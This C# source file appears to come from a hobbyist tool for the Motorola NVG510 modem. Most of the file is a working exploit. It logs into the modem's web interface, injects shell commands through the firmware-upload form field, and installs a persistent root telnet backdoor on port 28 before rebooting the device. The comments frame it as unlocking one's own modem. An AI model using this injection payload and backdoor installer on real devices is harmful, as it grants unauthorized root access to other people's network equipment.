using MinimalisticTelnet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace Earlz.NVG510Controller
{
    /// <summary>
    /// This launches the exploit against the web UI to enable telnet access
    /// </summary>
    public class WebExploiter
    {
        string Address;
        string Password;
        ILogger Logger;
        public WebExploiter(string address, string password, ILogger logger=null)
        {
            Address = address;
            Password = password;
            Logger = logger ?? new Earlz.NVG510Controller.ProblemFixer.NullLogger();
        }
        public void EnableBackdoorIfNeeded()
        {
            Logger.Log("Checking for backdoor installation on port 28");
            try
            {
                using(var t = new TelnetConnection(Address, 28));
                Logger.Log("Backdoor is already installed at port 28!");
                return;
            }
            catch
            {
                Logger.Log("Backdoor does not appear to be installed! Proceeding with installation");
            }
            EnableBackdoor(true);
            Logger.Log("Waiting 2 minutes for modem to reboot");
            Thread.Sleep(60 * 2000);
            try
            {
                using(var t = new TelnetConnection(Address, 28));
            }
            catch(Exception e)
            {
                Logger.Log("Backdoor installation did not appear to work! :( Nothing more can be done");
                throw;
            }
            Logger.Log("Backdoor installation accessible at port 28 is successful!");
        }
        public string EnableBackdoor(bool permanent)
        {
            if (!permanent)
            {
                throw new NotImplementedException("I haven't got this done yet :( ");
            }
            Logger.Log("Visiting update.ha page");
            var request = HttpWebRequest.Create("http://" + Address + "/cgi-bin/update.ha");
            string body;
            using (var response = request.GetResponse())
            {
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    body = reader.ReadToEnd();
                }
            }
            string nonce;
            if (body.Contains("Access Code Required"))
            {
                //requires login
                nonce = GetNonce(body);
                body = Login(nonce);
            }

            if (!body.Contains("Current software version"))
            {
                var e = new ApplicationException("Login appears to have been unsuccessful or this is not an NVG510. Nothing can be done");
                Logger.Log(e.Message);
                Logger.Log("Going to continue to try the exploit despite encountering an unexpected error");
                Logger.Log("It's very probable that something went wrong and enabling telnet/fixing problems will not work!");
                //throw e;
            }
            nonce = GetNonce(body);

            //get firmware version
            request = HttpWebRequest.Create("http://" + Address + "/cgi-bin/update.ha");
            using (var response = request.GetResponse())
            {
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    body = reader.ReadToEnd();
                }
            }
            nonce = GetNonce(body);
            try
            {
                //software version:&nbsp;
                var vstr = "software version:&nbsp;";
                int index = body.LastIndexOf(vstr);
                if (index < 0) index = 0; //basic error recovery
                var version = body.Substring(index + vstr.Length, 12);
                version = version.Split(new char[] { '<' }, StringSplitOptions.RemoveEmptyEntries)[0];
                Logger.Log("Modem firmware version appears to be '" + version + "'");
                if (!version.StartsWith("9.0"))
                {
                    Logger.Log("Does not appear to be an NVG510. This may not work yet on NVG589 and other modems");
                }
            }
            catch(Exception e)
            {
            }


            //sample POST: nonce=ddf4b72f000017291253b16bffe78c95a8b635d689827940&mgmt.shell.telnet-port=23&Save=Save
            //Can't fucking break it into new lines because it's not a real god damned shell. FUCK
            var cmd=WebUtility.UrlEncode(
@"errrr && echo echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh \> /var/etc/inetd.d/telnet28 > /tmp/fooex && "+
"echo pfs -a /var/etc/inetd.d/telnet28 >> /tmp/fooex && "+
"echo sleep 1 >> /tmp/fooex && " + //must add a sleep because the NVG is buggy and can't handle an add and then save right after each other
"echo pfs -s >> /tmp/fooex && echo sync >> /tmp/fooex && source /tmp/fooex && errr");
            request = WebRequest.Create("http://"+Address+"/cgi-bin/update.ha");
            request.Method = "POST";
            string postData = string.Format("nonce={0}&uploadfile={1}&Update=Update", nonce, cmd);
            byte[] byteArray = Encoding.UTF8.GetBytes (postData);
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = byteArray.Length;
            Stream requestStream = request.GetRequestStream ();
            // Write the data to the request stream.
            requestStream.Write (byteArray, 0, byteArray.Length);
            // Close the Stream object.
            requestStream.Close ();
            // Get the response.
            Logger.Log("Sending backdoor installation script");
            try
            {
                using (WebResponse response = request.GetResponse())
                {
                    // Display the status.
                    Console.WriteLine(((HttpWebResponse)response).StatusDescription);
                    string Response;
                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        // Read the content.
                        Response = reader.ReadToEnd();
                    }
                    // Display the content.
                    if (!Response.Contains("Invalid Firmware"))
                    {
                        throw new ApplicationException("Enabling telnet backdoor did not seem to work");
                    }
                    Console.WriteLine(Response);
                    // Clean up the streams.
                }
            }
            catch (WebException e) //fuck it. 
            {
                Logger.Log("Getting response after backdoor installation failed. It's probably still ok, continuing.. ");
            }
            Thread.Sleep(5000);
            Logger.Log("Rebooting modem");
            //doesn't require a nonce. Shouldn't require authentication at this point since AT&T's auth method is retardedly global
            request = HttpWebRequest.Create("http://" + Address + "/cgi-bin/restarting.ha");
            using (var resp = request.GetResponse())
            {
                using (var reader = new StreamReader(resp.GetResponseStream()))
                {
                    body = reader.ReadToEnd();
                    if (body.Length!=0 && !body.Contains("Your Motorola NVG510 is restarting"))
                    {
                        throw new ApplicationException("Automatic reboot didn't appear to work. You may have to manually reboot the modem");
                    }
                }
            }
            return null;
        }
       public string Login(string nonce)
        {
            Logger.Log("Authentication required. Attempting login to web interface");
            //sample POST: nonce=9558464c00001c0e81a74e520b048559a13682451e5c15de&password=0387371392&Continue=Continue
            WebRequest request = WebRequest.Create("http://"+Address+"/cgi-bin/login.ha");
            request.Method = "POST";
            string postData = string.Format("nonce={0}&password={1}&Continue=Continue", nonce, WebUtility.UrlEncode(Password).ToUpperInvariant());
            byte[] byteArray = Encoding.UTF8.GetBytes (postData);
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = byteArray.Length;
            Stream requestStream = request.GetRequestStream ();
            // Write the data to the request stream.
            requestStream.Write (byteArray, 0, byteArray.Length);
            // Close the Stream object.
            requestStream.Close ();
            // Get the response.
            using (WebResponse response = request.GetResponse())
            {
                // Display the status.
              //  Console.WriteLine(((HttpWebResponse)response).StatusDescription);
                string Response;
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    // Read the content.
                    Response = reader.ReadToEnd();
                }
                // Display the content.
              //  Console.WriteLine(Response);
                // Clean up the streams.
                return Response;
            }
        }
        string GetNonce(string html)
        {
            string search="<input type=\"hidden\" name=\"nonce\" value=\"";
            int index = html.IndexOf(search);
            if (index == -1)
            {
                throw new ApplicationException("Could not find 'nonce' value on page! Nothing can be done");
            }
            int end = html.IndexOf("\"", index + search.Length); //ending quote
            string nonce = html.Substring(index + search.Length, end - (index + search.Length));
            Logger.Log("Found nonce on page!");
            return nonce;
        }
    }
}
